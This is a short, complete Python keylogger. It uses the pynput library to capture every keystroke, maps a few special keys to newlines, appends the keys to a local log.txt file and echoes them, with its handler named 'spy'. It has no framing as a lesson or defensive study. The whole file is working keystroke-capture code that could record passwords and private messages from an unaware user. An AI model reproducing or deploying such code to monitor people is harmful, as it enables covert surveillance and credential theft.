from pynput.keyboard import Listener

def spy(key):
    key = str(key)
    key = key.replace("'","")
    
    if key == "Key.esc":
        raise SystemExit(0)
    
    if key == "Key.tab":
        key = "\n"
    
    if key == "Key.enter":
        key = "\n"
        
    if key == "Key.ctrl_l":
        key = "\n"
        
    if key == "Key.alt_l":
        key = "\n"    
    
    with open("log.txt","a") as file:
        file.write(key)
        
    print(key)

with Listener(on_press=spy) as listener:
    listener.join()

